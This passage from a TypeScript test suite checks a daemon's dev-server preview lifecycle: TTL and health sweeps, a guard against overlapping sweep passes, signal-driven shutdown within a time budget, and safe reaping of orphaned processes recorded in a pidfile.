    test("ttlMs = 0 disables the cap entirely", async () => {
      config.preview.ttlMs = 0;
      await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") }));
      await sweepOncePreviews(Date.now() + 10 * 24 * 60 * 60_000); // ten days on
      expect(isPreviewing("t_pv")).toBe(true);
    });

    test("a healthy preview is left alone", async () => {
      config.preview.ttlMs = 60_000;
      await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") }));
      await sweepOncePreviews();
      expect(getPreview("t_pv")?.status).toBe("ready");
    });

    // A dev server that stops serving must show on the board rather than sitting at
    // `ready` while the operator's tab fails to connect.
    //
    // It has to stop LISTENING while staying ALIVE. The first version killed the
    // process, which fires the child's close handler — so the entry was already
    // `failed` before the sweep ran, and mutation testing showed the whole health
    // block could be deleted with the test still green.
    test("a server that stops listening but stays alive is caught by the sweep", async () => {
      config.preview.ttlMs = 60_000; // not the TTL's doing
      await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}", "--close-after", "900") }));
      expect(getPreview("t_pv")?.status).toBe("ready");
      await new Promise((r) => setTimeout(r, 1_200));   // the listener closes, the process lives
      expect(getPreview("t_pv")?.status).toBe("ready"); // the close handler cannot have fired
      await sweepOncePreviews();
      expect(getPreview("t_pv")?.status).toBe("failed");
    });

    // THE NON-OVERLAP TEST. The tick is `if (sweeping) return`, and it exists because a
    // pass is a network probe per ready preview plus a TTL stop per expired one: without
    // it a slow pass overlaps the next tick and they stack, and one wedged stop blocks
    // the health check for every other preview.
    //
    // The interval is 30s, so the tick callback is taken off setInterval and driven by
    // hand — the guard is the code under test, not the timer. A ready preview whose
    // listener has gone away gives each pass that RUNS exactly one observable effect
    // (the transition to failed, emitted to every dashboard), so the frames count the
    // passes: two without the guard, one with it.
    test("a pass already in flight makes the next tick a no-op", async () => {
      config.preview.ttlMs = 60_000;   // not the TTL's doing
      await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}", "--close-after", "300") }));
      await new Promise((r) => setTimeout(r, 800));      // the listener closes; the process lives on
      expect(getPreview("t_pv")?.status).toBe("ready");  // so the close handler cannot have fired

      const ticks: Array<() => void> = [];
      const realSetInterval = globalThis.setInterval;
      // A real (huge, unref'd) timer is handed back so startPreviewSweep's unref() and
      // the reset's clearInterval both still work on it.
      (globalThis as any).setInterval = (fn: () => void) => { ticks.push(fn); return realSetInterval(() => { /* never */ }, 1 << 30); };
      try { startPreviewSweep(); } finally { (globalThis as any).setInterval = realSetInterval; }
      expect(ticks).toHaveLength(1);

      let frames = 0;
      const count = (id: string) => { if (id === "t_pv") frames++; };
      bus.on("update", count);
      try {
        ticks[0]();                                      // pass one — suspends in canConnect
        ticks[0]();                                      // the tick the guard has to swallow
        await new Promise((r) => setTimeout(r, 600));
      } finally { bus.off("update", count); }

      expect(frames).toBe(1);
      expect(getPreview("t_pv")?.status).toBe("failed");
    }, 20_000);
  });

  // These are the daemon's FIRST signal handlers. Registering one for SIGTERM
  // removes the default terminate behaviour, so from then on the process exits only
  // if this code says so. If it doesn't, `systemctl stop` hangs for TimeoutStopSec
  // and then SIGKILLs — orphaning every agent, which is far worse than the leaked
  // dev server the handler exists to prevent.
  describe("installPreviewShutdown", () => {
    const harness = join(import.meta.dir, "fixtures", "shutdown-harness.ts");

    /** Signal a real child and report how long it took to actually die. */
    function timeToExit(mode: string, signal: NodeJS.Signals): Promise<number> {
      return new Promise((resolve, reject) => {
        const child = spawn("bun", [harness, mode], { stdio: ["ignore", "pipe", "ignore"] });
        const giveUp = setTimeout(() => { child.kill("SIGKILL"); reject(new Error("never exited")); }, 15_000);
        child.stdout.once("data", () => {
          const t0 = Date.now();
          child.kill(signal);
          child.once("close", () => { clearTimeout(giveUp); resolve(Date.now() - t0); });
        });
      });
    }

    test("SIGTERM exits promptly", async () => {
      expect(await timeToExit("--normal", "SIGTERM")).toBeLessThan(3_000);
    });

    test("SIGINT exits promptly too", async () => {
      expect(await timeToExit("--normal", "SIGINT")).toBeLessThan(3_000);
    });

    // The `finally` is what makes this pass. Without it a rejected teardown leaves
    // the process alive with no default handler left to kill it.
    test("a teardown that throws still exits", async () => {
      expect(await timeToExit("--throw", "SIGTERM")).toBeLessThan(3_000);
    });

    // The budget is what makes this pass: a wedged dev server must not be able to
    // hold shutdown open past systemd's patience.
    test("a teardown that hangs exits on the budget", async () => {
      const ms = await timeToExit("--hang", "SIGTERM");
      expect(ms).toBeGreaterThanOrEqual(900);   // it really did wait for the budget
      expect(ms).toBeLessThan(5_000);           // and not a moment longer
    });

    test("a second signal does not start a second teardown", async () => {
      let calls = 0;
      const handlers: Array<() => void> = [];
      let exited = 0;
      installPreviewShutdown({
        stop: async () => { calls++; },
        exit: () => { exited++; },
        on: (_sig, fn) => handlers.push(fn),
      });
      handlers[0]();
      handlers[1]();  // the SIGINT handler, as a second Ctrl-C would
      await new Promise((r) => setTimeout(r, 50));
      expect(calls).toBe(1);
      expect(exited).toBe(1);
    });
  });

  describe("reapOrphans", () => {
    const pidfile = () => join(config.dataDir, "previews.json");
    const write = (records: unknown) => writeFileSync(pidfile(), JSON.stringify(records));

    afterEach(() => { try { rmSync(pidfile()); } catch { /* fine */ } });

    test("no pidfile is a no-op", async () => {
      try { rmSync(pidfile()); } catch { /* fine */ }
      expect(await reapOrphans()).toBe(0);
    });

    test("a malformed pidfile is ignored rather than thrown on", async () => {
      writeFileSync(pidfile(), "{not json");
      expect(await reapOrphans()).toBe(0);
      write({ notAn: "array" });
      expect(await reapOrphans()).toBe(0);
    });

    // THE PID-REUSE SAFETY TEST. A recorded pid is not an identity; killing a
    // recycled one is strictly worse than the port leak being fixed.
    //
    // The victim must be a real detached GROUP LEADER, like the supervisor's own
    // children. The first version recorded `process.pid`, and the test runner is not
    // a group leader — so `kill(-pid)` ESRCH'd and the test passed with the guard
    // deleted. Asserting the victim is still ALIVE afterwards is what distinguishes
    // "correctly skipped" from "the signal went nowhere".
    test("a starttime mismatch leaves the live process alone", async () => {
      const victim = spawn("sleep", ["30"], { detached: true, stdio: "ignore" });
      victim.unref();
      const pid = victim.pid!;
      try {
        write([{ taskId: "t_gone", pid, port: 18999, startedAt: Date.now(), starttime: 1 }]); // wrong on purpose
        expect(await reapOrphans()).toBe(0);
        await new Promise((r) => setTimeout(r, 200));
        expect(spawnSync("kill", ["-0", String(pid)]).status).toBe(0); // untouched
      } finally {
        try { process.kill(-pid, "SIGKILL"); } catch { /* already gone */ }
      }
    });

    // The same fail-closed rule for the other unverifiable case: a record whose
    // starttime we never captured. The earlier guard skipped the comparison
    // entirely when the RECORDED value was null and went on to signal.
    test("a record with no recorded starttime is never signalled", async () => {
      const victim = spawn("sleep", ["30"], { detached: true, stdio: "ignore" });
      victim.unref();
      const pid = victim.pid!;
      try {
        write([{ taskId: "t_gone", pid, port: 18999, startedAt: Date.now(), starttime: null }]);
        expect(await reapOrphans()).toBe(0);
        await new Promise((r) => setTimeout(r, 200));
        expect(spawnSync("kill", ["-0", String(pid)]).status).toBe(0); // untouched
        expect(notices().some((n) => n.code === "preview-orphan")).toBe(true); // and reported
      } finally {
        try { process.kill(-pid, "SIGKILL"); } catch { /* already gone */ }
      }
    });

    // A forged or corrupted pidfile must never reach a signal. kill(-0) would hit
    // the daemon's OWN group; kill(-1) everything the uid can reach.
    test("a pid that is not a real pid is refused outright", async () => {
      for (const pid of [0, -1, 1, 1.5, "123" as unknown as number]) {
        write([{ taskId: "t_gone", pid, port: 18999, startedAt: Date.now(), starttime: 1 }]);
        expect(await reapOrphans()).toBe(0);
      }
    });

    test("a matching starttime is reaped", async () => {
      // detached:true is what the supervisor uses, and it is load-bearing here:
      // killGroup is kill(-pid), which only addresses the child's group because
      // being detached makes it a group LEADER (pid === pgid). A plain background
      // job would sit in the shell's group and kill(-pid) would find nothing.
      const child = spawn("sleep", ["30"], { detached: true, stdio: "ignore" });
      child.unref();
      const pid = child.pid!;
      const stat = readFileSync(`/proc/${pid}/stat`, "utf8");
      write([{ taskId: "t_gone", pid, port: 18999, startedAt: Date.now(), starttime: parseStarttime(stat) }]);
      expect(await reapOrphans()).toBe(1);
      await new Promise((r) => setTimeout(r, 200));
      expect(spawnSync("kill", ["-0", String(pid)]).status).not.toBe(0);
    });

    test("a dead pid whose port is still held raises a notice rather than dropping quietly", async () => {
      // The wrapper died; the real server survived and still holds the port.
      const holder = Bun.listen({ hostname: "127.0.0.1", port: 18999, socket: { data() {} } });
      try {
        write([{ taskId: "t_gone", pid: 999_999, port: 18999, startedAt: Date.now(), starttime: 1 }]);
        expect(await reapOrphans()).toBe(0);
        expect(notices().some((n) => n.code === "preview-orphan" && n.message.includes("18999"))).toBe(true);
      } finally {
        holder.stop(true);
      }
    });

    test("a dead pid whose port is free drops silently", async () => {
      write([{ taskId: "t_gone", pid: 999_999, port: 18999, startedAt: Date.now(), starttime: 1 }]);
      expect(await reapOrphans()).toBe(0);
      expect(notices().some((n) => n.code === "preview-orphan")).toBe(false);
    });

    // The rewrite that keeps unresolvable records was pointless on its own:
    // writePidfile rebuilds the file from LIVE entries, so "kept for the next boot"
    // survived only until someone started or stopped a preview. keptOrphans is
    // merged back in by writePidfile; this is what proves that.
    test("a kept orphan record survives a later preview start and stop", async () => {
      const holder = Bun.listen({ hostname: "127.0.0.1", port: 18999, socket: { data() {} } });
      try {
        // A dead pid whose port is still held — the permanent-leak case, kept on purpose.
        write([{ taskId: "t_gone", pid: 999_999, port: 18999, startedAt: Date.now(), starttime: 1 }]);
        await reapOrphans();
        expect(JSON.parse(readFileSync(pidfile(), "utf8"))).toHaveLength(1);

        // Now churn the pidfile the way ordinary use does.
        await startPreview(task(), project({ preview: fixtureCmd("--port", "{port}") }));
        const afterStart = JSON.parse(readFileSync(pidfile(), "utf8"));
        expect(afterStart.some((r: any) => r.port === 18999)).toBe(true);   // still there
        await stopPreview("t_pv");
        const afterStop = JSON.parse(readFileSync(pidfile(), "utf8"));
        expect(afterStop.some((r: any) => r.port === 18999)).toBe(true);   // and still there
      } finally { holder.stop(true); }
    });

    test("the pidfile is consumed, so a second boot does not re-reap", async () => {
      write([{ taskId: "t_gone", pid: 999_999, port: 18999, startedAt: Date.now(), starttime: 1 }]);
      await reapOrphans();
      expect(existsSync(pidfile())).toBe(false);
    });

    // THE ESCALATION TEST. killGroup returning true means the signal was DELIVERED, not
    // that the group died — and a dev server that ignores SIGTERM is a shape this
    // branch's own fixture models, not a hypothetical. Counting delivery as a reap made
    // the boot log claim it had recovered a port that was in fact still held, by a
    // process still running, with the record already destroyed.
    test("an orphan that survives SIGTERM is escalated to SIGKILL before it counts", async () => {
      // --delay far beyond the test keeps it alive without ever listening, so nothing
      // here depends on a PORT that may be set in the environment.
      const orphan = spawn("bun", [FIXTURE, "--ignore-sigterm", "--delay", "999999"], { detached: true, stdio: "ignore" });
      orphan.unref();
      const pid = orphan.pid!;
      try {
        await new Promise((r) => setTimeout(r, 800));   // let bun get as far as installing the handler
        write([{ taskId: "t_gone", pid, port: 18999, startedAt: Date.now(), starttime: parseStarttime(readFileSync(`/proc/${pid}/stat`, "utf8")) }]);

        const t0 = Date.now();
        expect(await reapOrphans()).toBe(1);
        // It really went through the grace window rather than counting the SIGTERM.
        expect(Date.now() - t0).toBeGreaterThanOrEqual(1_400);
        expect(spawnSync("kill", ["-0", String(pid)]).status).not.toBe(0);
        // Reaped for real, so nothing is left for the next boot to retry.
        expect(existsSync(pidfile())).toBe(false);
      } finally {
        try { process.kill(-pid, "SIGKILL"); } catch { /* already gone */ }
      }
    }, 20_000);

    // THE REWRITE TEST. The old code unlinked the pidfile unconditionally, which
    // discarded the records it had deliberately LEFT ALONE — an unconfirmable identity,
    // or a group that survived even SIGKILL. Their ports then leaked forever, with the
    // one notice that could have explained it fired on a boot nobody was watching.
    // The records it has genuinely finished with must still go.
    test("a record it could not confirm is kept for the next boot, not discarded with the rest", async () => {
      const victim = spawn("sleep", ["30"], { detached: true, stdio: "ignore" });
      victim.unref();
      const pid = victim.pid!;
      try {
        write([
          { taskId: "t_unconfirmable", pid, port: 18998, startedAt: Date.now(), starttime: null },
          { taskId: "t_finished", pid: 999_999, port: 18999, startedAt: Date.now(), starttime: 1 },
        ]);
        expect(await reapOrphans()).toBe(0);

        expect(existsSync(pidfile())).toBe(true);
        const kept = JSON.parse(readFileSync(pidfile(), "utf8"));
        expect(kept).toHaveLength(1);
        expect(kept[0].taskId).toBe("t_unconfirmable");
        expect(kept[0].pid).toBe(pid);
        expect(kept[0].port).toBe(18998);
        // Kept because it was left alone, not because the kill failed.
        expect(spawnSync("kill", ["-0", String(pid)]).status).toBe(0);
      } finally {
        try { process.kill(-pid, "SIGKILL"); } catch { /* already gone */ }
      }
    });
  });
});
